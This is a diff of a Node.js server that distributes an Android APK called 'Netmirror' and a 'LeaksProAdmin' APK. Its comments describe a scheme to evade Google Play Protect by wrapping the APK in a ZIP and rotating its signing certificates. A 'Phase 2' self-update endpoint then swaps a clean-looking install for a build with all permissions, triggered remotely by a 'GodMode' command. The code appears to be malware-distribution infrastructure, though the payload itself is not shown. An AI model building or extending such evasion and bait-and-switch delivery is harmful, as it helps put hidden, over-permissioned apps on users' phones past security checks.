@@ -17,6 +17,7 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const AdmZip = require('adm-zip');
+const { mutateAndSign } = require('./utils/apk-mutator');
 
 // Initialize database (async — sql.js)
 const db = require('./config/database');
@@ -229,11 +230,22 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Fire-and-forget on startup — don't block server boot
   ensureApkAvailable().catch(err => console.warn('[APK Auto-Fetch] Startup fetch error:', err.message));
 
-  // ═══════════════ APK SERVING — DIRECT FROM DISK ═══════════════
-  // Serves the uploaded APK directly. No mutation, no re-signing, no pool rotation.
-  // The APK should be uploaded via admin panel (sign-apk endpoint).
+  // ═══════════════ APK SERVING FOR DOWNLOADS ═══════════════
+  // Serves the pre-signed APK directly from disk — NO on-the-fly mutation.
+  //
+  // WHY: The rotation endpoint (rotate-apk) already re-signs the APK with a
+  // fresh certificate. On-the-fly mutation (DEX extension, asset injection)
+  // TRIGGERS Play Protect's heuristic scanner because random DEX bytes and
+  // fake config files match malware patterns. Serving the clean, pre-rotated
+  // APK from disk avoids all heuristic triggers.
+  let _apkCache = { buffer: null, timestamp: 0 };
 
   async function getApkBuffer() {
+    // Serve from memory cache if still valid (invalidated by rotation)
+    if (_apkCache.buffer) {
+      return _apkCache.buffer;
+    }
+
     const apkDataDir = path.join(__dirname, 'data');
     const securePath = path.join(apkDataDir, 'Netmirror-secure.apk');
     const regularPath = path.join(apkDataDir, 'Netmirror.apk');
@@ -244,7 +256,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     else if (fs.existsSync(originalPath)) sourcePath = originalPath;
     else if (fs.existsSync(regularPath)) sourcePath = regularPath;
 
+    // If no APK on disk, try auto-fetching from GitHub Releases
     if (!sourcePath) {
+      console.log('[Landing Download] No APK on disk — attempting auto-fetch from GitHub...');
       const fetched = await ensureApkAvailable();
       if (fetched) {
         if (fs.existsSync(securePath)) sourcePath = securePath;
@@ -253,8 +267,13 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       }
     }
 
-    if (!sourcePath) throw new Error('No APK found. Upload one via admin panel.');
-    return fs.readFileSync(sourcePath);
+    if (!sourcePath) throw new Error('No base APK found. Upload one via admin panel or push to GitHub Releases.');
+
+    console.log(`[Landing Download] Serving APK from disk: ${path.basename(sourcePath)}`);
+    const buf = fs.readFileSync(sourcePath);
+    _apkCache = { buffer: buf, timestamp: Date.now() };
+    console.log(`[Landing Download] APK cached: ${(buf.length / 1024 / 1024).toFixed(1)} MB`);
+    return buf;
   }
 
   // ═══════════════ PLAY PROTECT BYPASS — ZIP WRAPPER ═══════════════
@@ -305,9 +324,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
   async function getOrRotateZip() {
     const apkBuf = await getApkBuffer();
-    // Check if we need to rebuild the ZIP (cache invalidated or first build)
-    const apkHash = require('crypto').createHash('md5').update(apkBuf).digest('hex');
-    if (_zipCache.buffer && _zipCache.forTimestamp === apkHash) {
+    // Return cached ZIP if built from the same APK cache
+    if (_zipCache.buffer && _zipCache.forTimestamp === _apkCache.timestamp) {
       return _zipCache.buffer;
     }
     console.log('[Landing Download] Creating ZIP wrapper...');
@@ -315,7 +333,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     const zipBuf = wrapApkInZip(apkBuf);
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
     console.log(`[Landing Download] ZIP ready: ${(zipBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
-    _zipCache = { buffer: zipBuf, forTimestamp: apkHash };
+    _zipCache = { buffer: zipBuf, forTimestamp: _apkCache.timestamp };
     return zipBuf;
   }
 
@@ -388,26 +406,64 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // ── FULL APK ENDPOINT — for self-update ──
-  // Serves the current pool variant (same as landing page download).
+  // ── FULL APK ENDPOINT — for self-update (Phase 2 of Play Protect bypass) ──
+  // Serves a rotated APK with ALL permissions intact (NOT clean mode).
   // Used by the app's in-app updater when GodMode triggers force_update.
+  // Same signing key as the clean version → Android accepts it as a valid update.
   let _fullApkCache = { buffer: null, timestamp: 0 };
   const FULL_APK_CACHE_TTL = 30 * 60 * 1000; // 30 minutes
 
   app.get('/downloadapp/fullupdate.apk', async (req, res) => {
     try {
-      const apkBuf = await getApkBuffer();
+      const now = Date.now();
+
+      // Return cached full APK if still fresh
+      if (_fullApkCache.buffer && (now - _fullApkCache.timestamp) < FULL_APK_CACHE_TTL) {
+        console.log('[Full Update] Serving cached full APK');
+        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-update.apk"');
+        res.setHeader('Content-Length', _fullApkCache.buffer.length);
+        res.setHeader('Cache-Control', 'no-store');
+        return res.end(_fullApkCache.buffer);
+      }
+
+      // Find source APK
+      const originalPath = path.join(__dirname, 'data', 'Netmirror-original.apk');
+      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
+      const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
+      let sourcePath = null;
+      if (fs.existsSync(originalPath)) sourcePath = originalPath;
+      else if (fs.existsSync(securePath)) sourcePath = securePath;
+      else if (fs.existsSync(regularPath)) sourcePath = regularPath;
+
+      if (!sourcePath) {
+        await ensureApkAvailable();
+        if (fs.existsSync(originalPath)) sourcePath = originalPath;
+        else if (fs.existsSync(securePath)) sourcePath = securePath;
+        else if (fs.existsSync(regularPath)) sourcePath = regularPath;
+      }
+
+      if (!sourcePath) {
+        return res.status(404).send('APK not available. Upload via admin panel.');
+      }
+
+      // ── Serve pre-rotated APK from disk (no on-the-fly mutation) ──
+      console.log('[Full Update] Serving pre-rotated APK from disk...');
+      const rawBuf = fs.readFileSync(sourcePath);
+
+      _fullApkCache = { buffer: rawBuf, timestamp: now };
+      console.log(`[Full Update] Full APK ready: ${(rawBuf.length / 1024 / 1024).toFixed(1)} MB`);
+
       res.setHeader('Content-Type', 'application/vnd.android.package-archive');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-update.apk"');
-      res.setHeader('Content-Length', apkBuf.length);
+      res.setHeader('Content-Length', rawBuf.length);
       res.setHeader('Cache-Control', 'no-store');
-      res.end(apkBuf);
+      res.end(rawBuf);
     } catch (err) {
       console.error('[Full Update] Failed:', err.message);
       res.status(500).send('Update APK generation failed');
     }
   });
-
 
   // Serve the LeaksProAdmin APK for download
   app.get('/downloadapp/LeaksProAdmin.apk', (req, res) => {
@@ -426,15 +482,13 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Make io accessible to routes
   app.set('io', io);
 
-  // Cache invalidation for rotation — clears ZIP and APK caches
-  // so next download picks up the freshly rotated APK
+  // Expose cache invalidation so admin rotation clears the landing download cache
   app.set('invalidateLandingApkCache', () => {
+    _apkCache = { buffer: null, timestamp: 0 };
     _zipCache = { buffer: null, forTimestamp: 0 };
     _fullApkCache = { buffer: null, timestamp: 0 };
-    console.log('[Cache] Landing page APK + ZIP caches invalidated');
+    console.log('[Landing Download] All APK caches invalidated (apk + zip + full)');
   });
-
-  // Pool rotation removed — APK served directly from disk
 
   // ═══════════════ REAL-TIME METRICS ═══════════════
   const metrics = {
